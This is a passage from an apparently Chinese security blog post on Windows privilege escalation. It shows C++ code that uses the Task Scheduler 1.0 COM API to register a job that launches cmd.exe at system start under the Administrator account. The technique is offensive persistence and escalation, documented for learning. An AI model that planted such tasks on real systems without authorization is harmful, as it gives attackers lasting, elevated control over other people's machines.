class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;initguid.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ole2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mstask.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;msterr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;objidl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable : 4996)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WGetUserName</span><span class="params">(WCHAR* username, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取并显示计算机的名称。</span></span><br><span class="line">    <span class="keyword">char</span>   szName[<span class="number">255</span>];</span><br><span class="line">    ULONG   nLen = <span class="keyword">sizeof</span>(szName);</span><br><span class="line">    ::GetUserNameA(szName, &amp;nLen);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(szName); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        username[i] = szName[i];</span><br><span class="line">    &#125;</span><br><span class="line">    username[<span class="built_in">strlen</span>(szName)] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, szName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HRESULT hr = S_OK;</span><br><span class="line">    ITaskScheduler* pITS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用CoInitialize初始化COM库，然后  </span></span><br><span class="line">    <span class="comment">//调用CoCreateInstance获取Task Scheduler对象。  </span></span><br><span class="line">    hr = CoInitialize(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (SUCCEEDED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        hr = CoCreateInstance(CLSID_CTaskScheduler,</span><br><span class="line">            <span class="literal">NULL</span>,</span><br><span class="line">            CLSCTX_INPROC_SERVER,</span><br><span class="line">            IID_ITaskScheduler,</span><br><span class="line">            (<span class="keyword">void</span>**)&amp;pITS);</span><br><span class="line">        <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">        &#123;</span><br><span class="line">            CoUninitialize();</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 获取计算机的用户名</span></span><br><span class="line">    WCHAR username[<span class="number">512</span>];</span><br><span class="line">    <span class="built_in">memset</span>(username, <span class="number">0</span>, <span class="keyword">sizeof</span>(username));</span><br><span class="line">    WGetUserName(username, <span class="keyword">sizeof</span>(username));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用ITaskScheduler::NewWorkItem创建新任务。  </span></span><br><span class="line">    WCHAR pwszTaskName[<span class="number">512</span>] = <span class="string">L"Test_Task"</span>;</span><br><span class="line">    ITask* pITask;</span><br><span class="line"></span><br><span class="line">    wcscat(pwszTaskName, username);</span><br><span class="line">    hr = pITS-&gt;NewWorkItem(pwszTaskName,         <span class="comment">// 任务名称</span></span><br><span class="line">        CLSID_CTask,          <span class="comment">// 类标识符</span></span><br><span class="line">        IID_ITask,            <span class="comment">// 接口标识符</span></span><br><span class="line">        (IUnknown**)&amp;pITask); <span class="comment">// 解决的任务</span></span><br><span class="line">    <span class="comment">//    接口</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pITS-&gt;Release();          <span class="comment">// 释放对象</span></span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Failed calling NewWorkItem, error = 0x%x\n"</span>, hr);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用ITask::SetApplicationName指定应用程序的名称</span></span><br><span class="line">    <span class="comment">//测试任务。</span></span><br><span class="line">    LPCWSTR pwszApplicationName = <span class="string">L"C:\\Windows\\System32\\cmd.exe "</span>;</span><br><span class="line">    hr = pITask-&gt;SetApplicationName(pwszApplicationName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling ITask::SetApplicationName: "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        pITask-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set flag仅在登录时设置</span></span><br><span class="line">        hr = pITask-&gt;SetFlags(TASK_FLAG_RUN_ONLY_IF_LOGGED_ON);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling ITask::EditWorkItem, "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 仅为登录设置用户名</span></span><br><span class="line">    hr = pITask-&gt;SetAccountInformation(<span class="string">L"Administrator"</span>, <span class="literal">NULL</span>); <span class="comment">//L"NT AUTHORITY\\SYSTEM"; </span></span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling ITask::SetApplicationName: "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        pITask-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用ITask::CreateTrigger来创建一个新的触发器。</span></span><br><span class="line">    ITaskTrigger* pITaskTrigger;</span><br><span class="line">    WORD piNewTrigger;</span><br><span class="line">    hr = pITask-&gt;CreateTrigger(&amp;piNewTrigger,</span><br><span class="line">        &amp;pITaskTrigger);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling ITask::CreatTrigger: "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        pITask-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义TASK_TRIGGER结构。注意,wBeginDay,</span></span><br><span class="line">    <span class="comment">//wBeginMonth和wBeginYear必须设置为一个有效的</span></span><br><span class="line">    <span class="comment">//分别为日、月、年。</span></span><br><span class="line">    TASK_TRIGGER pTrigger;</span><br><span class="line">    ZeroMemory(&amp;pTrigger, <span class="keyword">sizeof</span>(TASK_TRIGGER));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加代码设置触发器结构?</span></span><br><span class="line">    pTrigger.cbTriggerSize = <span class="keyword">sizeof</span>(TASK_TRIGGER);</span><br><span class="line">    pTrigger.wBeginDay = <span class="number">20</span>;                  <span class="comment">// 必需的</span></span><br><span class="line">    pTrigger.wBeginMonth = <span class="number">1</span>;                <span class="comment">// 必需的</span></span><br><span class="line">    pTrigger.wBeginYear = <span class="number">1997</span>;              <span class="comment">// 必需的</span></span><br><span class="line">    pTrigger.wStartHour = <span class="number">10</span>;</span><br><span class="line">    pTrigger.wStartMinute = <span class="number">10</span>;</span><br><span class="line">    pTrigger.MinutesDuration = <span class="number">600</span>;</span><br><span class="line">    pTrigger.TriggerType = TASK_EVENT_TRIGGER_AT_SYSTEMSTART;   <span class="comment">//TASK_EVENT_TRIGGER_AT_SYSTEMSTART   </span></span><br><span class="line">    pTrigger.Type.Daily.DaysInterval = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用ITaskTrigger::SetTrigger来设置触发条件。  </span></span><br><span class="line">    hr = pITaskTrigger-&gt;SetTrigger(&amp;pTrigger);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling ITaskTrigger::SetTrigger: "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        pITask-&gt;Release();</span><br><span class="line">        pITaskTrigger-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用IPersistFile::Save将触发器保存到磁盘。  </span></span><br><span class="line">    IPersistFile* pIPersistFile;</span><br><span class="line">    hr = pITask-&gt;QueryInterface(IID_IPersistFile,</span><br><span class="line">        (<span class="keyword">void</span>**)&amp;pIPersistFile);</span><br><span class="line">    hr = pIPersistFile-&gt;Save(<span class="literal">NULL</span>,</span><br><span class="line">        TRUE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling IPersistFile::Save: "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        pITask-&gt;Release();</span><br><span class="line">        pITaskTrigger-&gt;Release();</span><br><span class="line">        pIPersistFile-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    wprintf(<span class="string">L"The trigger was created and IPersistFile::Save was \n"</span>);</span><br><span class="line">    wprintf(<span class="string">L"called to save the new trigger to disk.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放资源。</span></span><br><span class="line">    pITask-&gt;Release();</span><br><span class="line">    pITaskTrigger-&gt;Release();</span><br><span class="line">    pIPersistFile-&gt;Release();</span><br><span class="line">    CoUninitialize();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Created task.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>运行后生成job文件</p>
+</blockquote>
+<p><img src="job.jpg" alt="生成的job文件"></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/10625?page=1" target="_blank" rel="noopener">关于计划任务的探究</a></p>
+<p><a href="https://blog.csdn.net/yaoxuanzhi/article/details/57562955?ops_request_misc=&request_id=&biz_id=102&utm_term=C++%20Task%20Scheduler%202.0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-57562955.first_rank_v2_pc_rank_v29&spm=1018.2226.3001.4187" target="_blank" rel="noopener">Task Scheduler 2.0的相关操作</a></p>
+<p><a href="https://docs.microsoft.com/zh-cn/windows/win32/taskschd/task-scheduler-2-0-interfaces?redirectedfrom=MSDN" target="_blank" rel="noopener">任务计划程序 2.0 接口</a></p>
+<p><a href="https://www.cnblogs.com/hrhguanli/p/4095448.html" target="_blank" rel="noopener">计划任务中使用NT AUTHORITY\SYSTEM用户和普通管理员用户有什么差别</a></p>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/taskschd/tasks" target="_blank" rel="noopener">Tasks</a></p>
+<p><a href="https://blog.csdn.net/chantsky/article/details/82904942?spm=1001.2101.3001.6650.5&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-5.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-5.pc_relevant_default&utm_relevant_index=10" target="_blank" rel="noopener">VC++创建计划任务的若干方式</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/C/" rel="tag"># C++</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/11/22/%E5%BE%AE%E4%BF%A1pc%E5%85%AC%E4%BC%97%E5%8F%B7%E5%8F%8A%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8F%96%E6%95%B0%E6%8D%AE%E5%8C%85/" rel="prev" title="微信pc公众号及微信小程序抓取数据包">
+      <i class="fa fa-chevron-left"></i> 微信pc公众号及微信小程序抓取数据包
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/02/10/C-%E6%8F%90%E6%9D%83%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-win-%E4%BA%8C/" rel="next" title="C++提权的几种方式(win)(二)">
+      C++提权的几种方式(win)(二) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="comments"></div>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#常见问题"><span class="nav-number">1.</span> <span class="nav-text">常见问题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#C-Task-Scheduler-2-0提权"><span class="nav-number"></span> <span class="nav-text">C++ Task Scheduler 2.0提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#注意：客户端需要-Windows-Vista-或更高版本。服务器需要-Windows-Server-2008-或更高版本。必须要管理员权限才可以运行添加计划任务。"><span class="nav-number">0.1.</span> <span class="nav-text">注意：客户端需要 Windows Vista 或更高版本。服务器需要 Windows Server 2008 或更高版本。必须要管理员权限才可以运行添加计划任务。</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#C-Task-Scheduler-1-0写入提权（利用COM组件的-API-编程创建计划任务）"><span class="nav-number"></span> <span class="nav-text">C++ Task Scheduler 1.0写入提权（利用COM组件的 API 编程创建计划任务）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#注意：Task-Scheduler-1-0是在C-Windows-Tasks目录下生成job文件，如果job文件存在重复会报错，注意及时删除。客户端需要-Windows-Vista-或-Windows-XP。服务器需要-Windows-Server-2008-或-Windows-Server-2003。"><span class="nav-number">0.1.</span> <span class="nav-text">注意：Task Scheduler 1.0是在C:\Windows\Tasks目录下生成job文件，如果job文件存在重复会报错，注意及时删除。客户端需要 Windows Vista 或 Windows XP。服务器需要 Windows Server 2008 或 Windows Server 2003。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用-Task-Scheduler-1-0-的几个注意点："><span class="nav-number">0.2.</span> <span class="nav-text">使用 Task Scheduler 1.0 的几个注意点：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章"><span class="nav-number">1.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ChenZIDu"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">ChenZIDu</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">90</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">58</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/chenzidu" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chenzidu" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:oinsm@outlook.com" title="E-Mail → mailto:oinsm@outlook.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/ChenZIDu1" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;ChenZIDu1" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.loongten.com/" title="https:&#x2F;&#x2F;www.loongten.com&#x2F;" rel="noopener" target="_blank">Keac's</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://hsnico.github.io/" title="https:&#x2F;&#x2F;hsnico.github.io" rel="noopener" target="_blank">Hsnico'blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.suk1.top/" title="https:&#x2F;&#x2F;www.suk1.top&#x2F;" rel="noopener" target="_blank">晓黑</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.dreams-wj.top/" title="https:&#x2F;&#x2F;blog.dreams-wj.top" rel="noopener" target="_blank">HKer_YM</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ncsec.cn/" title="https:&#x2F;&#x2F;blog.ncsec.cn&#x2F;" rel="noopener" target="_blank">RoarNya</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ChenZIDu</span>
+</div>
+  <div class="powered-by">Oinsm
+    
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Web – <a href="https://github.com/ChenZIDu" rel="noopener" target="_blank">🙂</a>
+    
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(item => {
+    return GUEST.includes(item);
+  });
+  new Valine({
+    el: '#comments',
+    verify: true,
+    notify: true,
+    appId: 'Kp900xxAQMLq3K0AkgqsPzcV-gzGzoHsz',
+    appKey: 'XdnaoJVs9feaETzUFPUq79tD',
+    placeholder: "Just go go",
+    avatar: 'robohash',
+    meta: guest,
+    pageSize: '5' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn',
+    path: location.pathname,
+    recordIP: true,
+    serverURLs: ''
+  });
+}, window.Valine);
+</script>
+
+</body>
+</html>
